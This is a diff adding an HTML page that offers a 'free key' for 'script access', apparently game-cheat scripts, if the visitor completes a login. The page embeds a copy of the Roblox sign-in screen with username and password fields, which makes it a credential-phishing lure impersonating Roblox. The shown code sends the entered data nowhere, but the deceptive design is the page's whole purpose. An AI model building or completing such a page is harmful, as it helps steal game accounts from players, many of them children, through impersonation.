@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Get Your Free Key - Roblox Login</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        /* Custom styles for arbitrary values */
+        .bg-green-500\/80 { background-color: rgba(34, 197, 94, 0.8); }
+        .text-white\/90 { color: rgba(255, 255, 255, 0.9); }
+        .border-white\/20 { border-color: rgba(255, 255, 255, 0.2); }
+        .bg-black\/30 { background-color: rgba(0, 0, 0, 0.3); }
+        .text-black\/80 { color: rgba(0, 0, 0, 0.8); }
+    </style>
+</head>
+<body>
+    <div class="min-h-screen bg-black relative overflow-hidden">
+        <!-- Background GIF -->
+        <img
+            src="https://media1.tenor.com/m/8d-ueVpIfNwAAAAd/demon-slayer.gif"
+            alt="Demon Slayer background"
+            class="absolute inset-0 w-full h-full object-cover"
+        />
+
+        <!-- Transparent Overlay -->
+        <div class="relative z-10 min-h-screen">
+            <div class="container mx-auto px-5 py-10 min-h-screen flex flex-col">
+                <!-- Header Section -->
+                <div class="text-center mb-8">
+                    <div class="text-4xl mb-4">🔓</div>
+                    <h1 class="text-4xl md:text-5xl font-bold text-white mb-2">
+                        Get Your Free Key
+                    </h1>
+                    <p class="text-lg text-white/90 max-w-md mx-auto">
+                        Complete the login to unlock your script access
+                    </p>
+                </div>
+
+                <!-- Main Card -->
+                <div class="bg-green-500/80 rounded-2xl p-6 mb-6 max-w-2xl mx-auto w-full">
+                    <!-- Roblox Login Header -->
+                    <div class="flex items-center justify-between mb-6 pb-4 border-b border-white/20">
+                        <div class="flex items-center">
+                            <span class="text-xl mr-3">🎮</span>
+                            <h2 class="text-xl font-semibold text-white">Roblox Login</h2>
+                        </div>
+                        <div class="w-6 h-6 bg-green-500 rounded-full flex items-center justify-center">
+                            <span class="text-white text-sm font-bold">✓</span>
+                        </div>
+                    </div>
+
+                    <!-- Embedded Roblox Interface -->
+                    <div class="bg-gray-700 rounded-xl overflow-hidden" style="background-color: #2a2a2a;">
+                        <!-- Top Navigation Bar -->
+                        <div class="flex items-center px-4 py-3" style="background-color: #1a1a1a;">
+                            <div class="mr-4">
+                                <span class="text-white text-lg">⬜</span>
+                            </div>
+                            <div class="flex-1 flex items-center bg-gray-600 rounded px-3 py-2 mr-3" style="background-color: #333;">
+                                <span class="mr-2">🔍</span>
+                                <span class="text-gray-400 text-sm">Search</span>
+                            </div>
+                            <button class="bg-blue-600 text-white px-4 py-2 rounded text-sm font-semibold hover:bg-blue-700 transition-colors">
+                                Sign Up
+                            </button>
+                        </div>
+
+                        <!-- Navigation Tabs -->
+                        <div class="flex items-center px-4 py-2 space-x-6" style="background-color: #1a1a1a;">
+                            <span class="text-gray-300 text-sm">Charts</span>
+                            <span class="text-gray-300 text-sm">Marketplace</span>
+                            <span class="text-gray-300 text-sm">Create</span>
+                            <span class="text-gray-300 text-sm">Robux</span>
+                        </div>
+
+                        <!-- Login Form -->
+                        <div class="p-6" style="background-color: #2a2a2a;">
+                            <h3 class="text-xl font-bold text-white text-center mb-6">
+                                Login to Roblox
+                            </h3>
+
+                            <div class="space-y-4">
+                                <input
+                                    type="text"
+                                    placeholder="Username/Email/Phone"
+                                    class="w-full text-white px-4 py-3 rounded border-0 placeholder:text-gray-400 focus:outline-none focus:ring-2 focus:ring-blue-500"
+                                    style="background-color: #3a3a3a;"
+                                />
+
+                                <input
+                                    type="password"
+                                    placeholder="Password"
+                                    class="w-full text-white px-4 py-3 rounded border-0 placeholder:text-gray-400 focus:outline-none focus:ring-2 focus:ring-blue-500"
+                                    style="background-color: #3a3a3a;"
+                                />
+
+                                <button class="w-full bg-blue-600 text-white py-3 rounded font-semibold hover:bg-blue-700 transition-colors">
+                                    Log In
+                                </button>
+
+                                <div class="text-center">
+                                    <button class="text-blue-400 text-sm hover:text-blue-300 transition-colors">
+                                        Forgot Password or Username?
+                                    </button>
+                                </div>
+
+                                <button class="w-full text-white py-3 rounded hover:bg-gray-500 transition-colors" style="background-color: #4a4a4a;">
+                                    Email Me a One-Time Code
+                                </button>
+
+                                <button class="w-full text-white py-3 rounded hover:bg-gray-500 transition-colors" style="background-color: #4a4a4a;">
+                                    Use Another Device
+                                </button>
+
+                                <p class="text-center text-gray-300 text-sm">
+                                    Don't have an account?
+                                    <button class="text-blue-400 font-semibold hover:text-blue-300 transition-colors">
+                                        Sign Up
+                                    </button>
+                                </p>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Mark as Complete Button -->
+                    <button class="w-full bg-green-500 text-white py-4 rounded-lg font-semibold text-lg mt-6 hover:bg-green-600 transition-colors">
+                        Mark as Complete
+                    </button>
+                </div>
+
+                <!-- Footer -->
+                <div class="text-center mt-auto">
+                    <div class="inline-block bg-black/30 text-black/80 px-4 py-2 rounded-full text-sm">
+                        ⚡ Powered by Anything
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
